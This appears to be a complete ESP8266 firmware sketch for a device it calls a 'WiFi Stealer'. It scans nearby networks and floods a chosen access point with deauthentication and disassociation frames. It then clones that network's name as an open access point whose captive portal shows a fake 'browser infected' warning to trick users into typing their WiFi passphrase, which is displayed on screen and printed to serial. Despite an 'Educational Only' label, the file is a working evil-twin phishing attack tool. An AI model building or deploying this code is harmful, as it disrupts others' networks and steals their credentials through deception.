#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <ezButton.h>
#ifdef ESP8266

#define SUBTITLE "! BROWSER INFECTED !"
#define TITLE ""
#define BODY "Your connection or router was locked. The device has alerted you that it was infected with virus and spyware. The following data are at risk : instagram, facebook, email credential, etc. Enter your valid WiFi Passphrase to restart your connection."
#define POST_TITLE "Password Verification ..."
#define POST_BODY "Wait for +/-60 second to connect.</br>Thank You."

extern "C" {
#include "user_interface.h"
}
#endif
//_________________________________________________________________
#include "SH1106.h"
SH1106 display(0x3c, 5, 4); //balik ini bila OLED tidak muncul

//#include "SSD1306.h"
//SSD1306 display(0x3c, 5, 4); 

bool deAuth = false;
const int SHORT_PRESS_TIME = 500; 
const int LONG_PRESS_TIME  = 2000;
char ssid[20];
//----------------------------------------------------------------
// Captive Portal Prerequisites : -
//----------------------------------------------------------------
/*const char MAIN_page[] PROGMEM = R"=====(
<!DOCTYPE html>
<html>
<body>
<h3> UPDATE YOUR WIFI ROUTER</h3>
<form action="/update">
  Please Authorize to continue:<br>
  <input type="password" name="passwd" placeholder="PASSWORD">
  <br>
  <input type="submit" value="Submit">
</form> 
</body>
</html>
)====="; */

String header(String t) {
  String a = String(ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/update' >" +
  "<b>Password:</b> <center><input type=password name=passwd></input><input type=submit value=\"Submit\"></form></center>" + footer();
}

String posted() {
return header(POST_TITLE) + POST_BODY + "<script> setTimeout(function(){window.location.href = '/update';}, 15000); </script>" + footer();

}

String footer() { 
  return "</div><div class=q><a>&#169; All rights reserved 2022.</a></div>";
}

const byte DNS_PORT = 53;
//IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer server(80); 

//ip on browser routine
void handleRoot() {
// String s = MAIN_page; //Read HTML contents
server.send(200, "text/html", index()); //Send web page
server.send(200, "text/html", footer()); //Send web page
}
//submit button routine 
void handleForm() {
 //server.send(200, "text/html", posted()); //Send web page 
 String passwd = server.arg("passwd"); 
 Serial.print("Password:");
 Serial.println(passwd); 
 display.clear();
 display.setFont(ArialMT_Plain_16);
 display.drawString(0, 0, "Password Capt:");
 display.drawString(0, 20, passwd);
 display.display();
 WiFi.mode(WIFI_OFF);
 delay(15000000);
// ESP.restart();
 //String s = "<a href='/'> Go Back </a>";
 //server.send(200, "text/html", s); //Send web page
}

/*void handleResult() {
  Serial.println("HandleResult");
  String html = "";
  String passwd = server.arg("passwd"); 
  server.send(200, "text/html", posted()); //Send web page
  
  if (WiFi.status() != WL_CONNECTED) {
    server.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Passphrase</h2><p>Try again...</p></body> </html>");
    display.clear();
    display.drawString(0, 16, "WRONG PASSPHRASE"); 
    display.display();  
    delay(500);
    Serial.println("Wrong Passphrase!");
  } else {
    server.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Passphrase OK</h2></body> </html>");
       // Deauthing command nanti isi 
      dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    //WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    //WiFi.softAP("WizzLinked", "wizz12345");
   // dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
   // _correct = "<passfont>" +_selectedNetwork.ssid + " Passphrase: " + _tryPassword +"</passfont>";
    Serial.println("Good Passphrase!");
   
  display.clear();
  display.drawString(0, 30, "GOOD PASSPHRASE!");
  display.display();

 
 Serial.print("Password:");
 Serial.println(passwd); 
 display.clear();
 display.setFont(ArialMT_Plain_10);
 display.drawString(0, 0, "Password Captured:");
 display.drawString(0, 20, passwd);
 display.display();
 WiFi.mode(WIFI_OFF);
 delay(15000);
 ESP.restart();
 delay(1000);

    }
}*/

//----------------------------------------------------------------
uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};


bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {
    wifi_set_channel(wifi_channel);
    bool sent = false;
    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
    return sent;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {
    bool success = false;
    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);
    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }
    // send disassociate frame
    packet[0] = 0xa0;

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    return success;
}
//_____________________________________________________________________

ezButton button(2);  

unsigned long pressedTime  = 0;
unsigned long releasedTime = 0;
boolean bt = false;
boolean caPtl = true;
#define flipDisplay true

int n,i=0;
void setup() {
  display.init();
  if(flipDisplay) display.flipScreenVertically();
  //_____________________________________________
  display.clear();
  display.setFont(ArialMT_Plain_16);
  display.drawString(0, 0, "WiFi");
  display.drawString(0, 16, "Stealer Device");
  display.drawString(0, 32, "Educational Only");
  display.setFont(ArialMT_Plain_10);
  display.drawString(0, 50, "WizzTech - WFH 2022");
  display.display();
  //_____________________________________________
  Serial.begin(115200);
  Serial.println("");
  //_____________________________________________
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(); 
  delay(100);
  n = WiFi.scanNetworks();
  //_____________________________________________
  button.setDebounceTime(50);
  //_____________________________________________
  delay(2500);
}

void disp()
{
  button.loop(); 
  if(button.isPressed())
  { 
    bt=true;
    pressedTime = millis();
  }
  if(button.isReleased()) {
    releasedTime = millis();
    bt=false;
    long pressDuration = releasedTime - pressedTime;

    if( pressDuration < SHORT_PRESS_TIME )
      Serial.println("A short press is detected");
      i++;
  }
  long pressDuration2 = millis() - pressedTime;
  if( pressDuration2 > LONG_PRESS_TIME && bt==true )
  {
    deAuth=true;
    bt=false;
  }
    i=i%n;
    display.clear();
    display.setFont(ArialMT_Plain_16);
    display.drawString(0, 0, WiFi.SSID(i));
    display.drawString(0, 16, "SignaL |");
    display.drawString(64, 16, String(WiFi.RSSI(i)));
    display.drawString(0, 32, "Channel|");
    display.drawString(64, 32, String(WiFi.channel(i)));
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 50, String(i+1));
    display.drawString(6, 50,"/");
    display.drawString(10, 50, String(n));
    display.display();
}

void deauthLoop()
{
    WiFi.SSID(i).toCharArray(ssid,20);
    deauthDevice(WiFi.BSSID(i), WiFi.channel(i));
    display.clear();
    display.setFont(ArialMT_Plain_16);
    display.drawString(0, 0, WiFi.SSID(i));
    display.drawString(0, 16, "SignaL |");
    display.drawString(64, 16, String(WiFi.RSSI(i)));
    display.drawString(0, 32, "Channel|");
    display.drawString(64, 32, String(WiFi.channel(i)));
    display.setFont(ArialMT_Plain_10);
    display.drawString(0, 50, "Start Deauth & Clone");
    display.drawString(100, 50,String(deauthDevice(WiFi.BSSID(i), WiFi.channel(i))));
    display.display();
    if(caPtl)
    {
        //MASIH ERRORRRRRRRRRRRRRRRRRRRRRRRRRRR
        
        WiFi.mode(WIFI_AP_STA);// dual mode
        //WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssid);  
        Serial.println("");
        //dnsServer.start(DNS_PORT, "*", apIP);
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
        
        server.on("/", handleRoot);
       // server.on("/result", handleResult);
        server.on("/update", handleForm);
        server.onNotFound(handleRoot);
        server.begin(); 
        caPtl=false;
    }
    delay(1000);
}
void loop()
{
  if(deAuth)
  {
    deauthLoop();
    dnsServer.processNextRequest();
    server.handleClient();  
  }
  else
  {
    disp();
  }
}
